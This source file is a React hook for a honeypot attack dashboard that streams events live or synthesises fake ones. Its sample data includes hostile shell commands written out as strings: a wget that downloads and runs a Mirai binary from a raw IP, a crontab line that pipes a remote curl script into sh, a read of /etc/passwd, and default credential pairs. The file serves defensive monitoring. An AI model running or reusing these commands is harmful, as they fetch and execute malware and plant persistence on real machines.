import { useEffect, useRef, useState } from 'react';
import { startAttackHub, stopAttackHub } from '@/api/signalr';
import { useConnectionStore } from '@/stores/connectionStore';
import type { HoneypotEvent, HoneypotEventType, SensorType } from '@/types/api';

/**
 * Live attack stream hook.
 *
 * Tries to connect to the real SignalR hub (/hubs/attacks). When a real backend
 * is unavailable — i.e. local dev with MSW, which cannot intercept WebSockets —
 * it transparently falls back to a lightweight client-side simulator so the
 * dashboard (live feed + attack map) stays demoable without a backend.
 *
 * The simulator is intentionally self-contained (no dependency on the MSW
 * generator) so it can ship in the app bundle without pulling in mock fixtures.
 */

export interface UseLiveAttacksOptions {
  /** Maximum number of events to retain in the rolling buffer. Default 200. */
  bufferSize?: number;
  /** Whether to start the stream. Default true. */
  enabled?: boolean;
}

export interface UseLiveAttacksResult {
  /** Newest-first rolling buffer of live events. */
  events: HoneypotEvent[];
  /** The single most recent event (handy for map pulses). */
  latest: HoneypotEvent | null;
  /** True when the synthetic simulator is driving the stream (no real hub). */
  simulated: boolean;
}

const GEO_POOL = [
  { country: 'CN', countryName: 'Chiny', city: 'Szanghaj', lat: 31.23, lon: 121.47, asn: 4134, org: 'Chinanet' },
  { country: 'RU', countryName: 'Rosja', city: 'Moskwa', lat: 55.75, lon: 37.62, asn: 12389, org: 'Rostelecom' },
  { country: 'US', countryName: 'Stany Zjednoczone', city: 'Ashburn', lat: 39.04, lon: -77.49, asn: 14618, org: 'Amazon AWS' },
  { country: 'BR', countryName: 'Brazylia', city: 'São Paulo', lat: -23.55, lon: -46.63, asn: 28573, org: 'Claro S.A.' },
  { country: 'IN', countryName: 'Indie', city: 'Mumbaj', lat: 19.08, lon: 72.88, asn: 9829, org: 'BSNL' },
  { country: 'VN', countryName: 'Wietnam', city: 'Hanoi', lat: 21.03, lon: 105.85, asn: 45899, org: 'VNPT' },
  { country: 'NL', countryName: 'Holandia', city: 'Amsterdam', lat: 52.37, lon: 4.9, asn: 60781, org: 'LeaseWeb' },
  { country: 'IR', countryName: 'Iran', city: 'Teheran', lat: 35.69, lon: 51.39, asn: 197207, org: 'MCCI' },
  { country: 'DE', countryName: 'Niemcy', city: 'Frankfurt', lat: 50.11, lon: 8.68, asn: 24940, org: 'Hetzner Online' },
] as const;

const SENSOR_IDS: Record<SensorType, readonly string[]> = {
  ssh: ['hp-ssh-weu-01', 'hp-ssh-neu-02', 'hp-ssh-eus-03'],
  web: ['hp-web-weu-01', 'hp-web-sea-02'],
  rdp: ['hp-rdp-weu-01', 'hp-rdp-eus-02'],
};

const CREDS = [
  { username: 'root', password: '123456' },
  { username: 'admin', password: 'admin' },
  { username: 'pi', password: 'raspberry' },
  { username: 'root', password: 'root' },
  { username: 'ubuntu', password: 'ubuntu' },
];

const COMMANDS = [
  'wget http://185.224.128.43/bins/mirai.x86 -O /tmp/.x; chmod +x /tmp/.x; /tmp/.x',
  'uname -a',
  'cat /etc/passwd',
  'crontab -l; echo "*/5 * * * * curl -fsSL http://193.32.162.71/c.sh | sh" | crontab -',
];

const HTTP_PATHS = [
  { method: 'GET', path: '/.env' },
  { method: 'GET', path: '/wp-login.php' },
  { method: 'POST', path: '/boaform/admin/formLogin' },
  { method: 'GET', path: '/actuator/health' },
];

const KILL_CHAIN = ['recon', 'delivery', 'exploitation', 'installation', 'c2'] as const;
const CATEGORIES = ['brute-force', 'botnet', 'cryptomining', 'web-scan', 'webshell'] as const;

let seq = 0;

function pick<T>(arr: readonly T[]): T {
  return arr[Math.floor(Math.random() * arr.length)];
}

function randInt(min: number, max: number): number {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomIp(): string {
  return `${randInt(1, 223)}.${randInt(0, 255)}.${randInt(0, 255)}.${randInt(1, 254)}`;
}

/** Builds one synthetic but plausible honeypot event. */
export function synthesizeEvent(): HoneypotEvent {
  seq += 1;
  const sensorType: SensorType = pick(['ssh', 'ssh', 'ssh', 'web', 'web', 'rdp']);
  const eventTypeBySensor: Record<SensorType, readonly HoneypotEventType[]> = {
    ssh: ['login.failed', 'login.failed', 'login.success', 'command', 'connect'],
    web: ['http.request', 'http.request', 'connect'],
    rdp: ['login.failed', 'connect'],
  };
  const eventType = pick(eventTypeBySensor[sensorType]);
  const geo = pick(GEO_POOL);
  const malicious = Math.random() < 0.55;

  const event: HoneypotEvent = {
    id: `evt-live-${Date.now()}-${seq.toString(36)}`,
    attackerIp: randomIp(),
    sensorId: pick(SENSOR_IDS[sensorType]),
    sensorType,
    timestamp: new Date().toISOString(),
    eventType,
    sessionId: eventType === 'connect' ? undefined : `sess-${randInt(1000, 9999)}`,
    geo: { ...geo },
    threatIntel: {
      knownMalicious: malicious,
      sources: malicious ? ['AbuseIPDB'] : [],
      score: malicious ? randInt(60, 100) : randInt(0, 40),
    },
    classification: {
      killChainPhase: pick(KILL_CHAIN),
      category: pick(CATEGORIES),
      sophistication: (Math.random() * 0.9 + 0.05).toFixed(2),
      intent: malicious ? 'budowa botnetu' : 'rozpoznanie',
    },
  };

  if (eventType === 'login.failed' || eventType === 'login.success') {
    event.credentials = pick(CREDS);
  } else if (eventType === 'command') {
    event.command = pick(COMMANDS);
  } else if (eventType === 'http.request') {
    event.http = { ...pick(HTTP_PATHS), userAgent: 'python-requests/2.31.0' };
  }
  return event;
}

/**
 * Global event bus for attacks. Every pushed event (real hub or simulator) is
 * dispatched here so lightweight consumers — like the critical-attack toaster —
 * can react to the same stream without opening a second connection.
 */
export const attackBus = new EventTarget();
export const ATTACK_BUS_EVENT = 'attack';

export function useLiveAttacks(options?: UseLiveAttacksOptions): UseLiveAttacksResult {
  const bufferSize = options?.bufferSize ?? 200;
  const enabled = options?.enabled ?? true;
  const [events, setEvents] = useState<HoneypotEvent[]>([]);
  const [latest, setLatest] = useState<HoneypotEvent | null>(null);
  const [simulated, setSimulated] = useState(false);
  const setStatus = useConnectionStore((s) => s.setStatus);

  // Keep the buffer cap in a ref so the push closure stays stable.
  const bufferRef = useRef(bufferSize);
  bufferRef.current = bufferSize;

  useEffect(() => {
    if (!enabled) return;
    let disposed = false;
    let timer: ReturnType<typeof setInterval> | undefined;

    const push = (event: HoneypotEvent) => {
      if (disposed) return;
      setLatest(event);
      attackBus.dispatchEvent(new CustomEvent(ATTACK_BUS_EVENT, { detail: event }));
      setEvents((prev) => {
        const next = [event, ...prev];
        return next.length > bufferRef.current ? next.slice(0, bufferRef.current) : next;
      });
    };

    const startSimulator = () => {
      if (disposed) return;
      setSimulated(true);
      setStatus('connected');
      // Seed a few events so the views aren't empty on first paint.
      for (let i = 0; i < 12; i += 1) push(synthesizeEvent());
      timer = setInterval(() => {
        const burst = randInt(1, 3);
        for (let i = 0; i < burst; i += 1) push(synthesizeEvent());
      }, 1500);
    };

    if (import.meta.env.PROD) {
      // Production: connect to the real SignalR hub; fall back to the simulator
      // if the hub is unreachable so the dashboard still shows activity.
      startAttackHub(push)
        .then(() => {
          if (disposed) return;
          // startAttackHub swallows errors and leaves status !== 'connected' on
          // failure; treat that as "no backend" and switch to the simulator.
          if (useConnectionStore.getState().status !== 'connected') {
            startSimulator();
          }
        })
        .catch(() => startSimulator());
    } else {
      // Dev / tests run on MSW mocks, which cannot intercept WebSockets — drive
      // the stream deterministically with the client-side simulator.
      startSimulator();
    }

    return () => {
      disposed = true;
      if (timer) clearInterval(timer);
      void stopAttackHub();
    };
  }, [enabled, setStatus]);

  return { events, latest, simulated };
}
